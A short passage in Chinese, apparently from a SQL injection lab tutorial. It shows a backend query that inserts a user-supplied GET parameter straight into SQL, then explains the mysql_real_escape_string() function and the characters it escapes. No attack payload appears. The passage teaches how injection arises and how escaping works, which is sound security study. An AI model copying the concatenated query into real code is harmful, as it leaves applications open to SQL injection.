  2. 后台的查询语句是select first_name, last_name from users where user_id = '$id';，$id就是你在submit提交框内输入的内容，通过$_GET方法传递给后台服务器。

mysql_real_escape_string()函数：转义 SQL 语句字符串中的特殊字符，如输入单引号'则处理时会在其前面加上反斜杠\来进行转义，如果语句错误则输出相应的错误信息。其中受影响的字符如下：

字符 意义
\x00 空字符（null）
\n 换行
\r 回车
\ 反斜杠
‘ 单引号
‘’ 双引号
\x1a 代替（substitute）
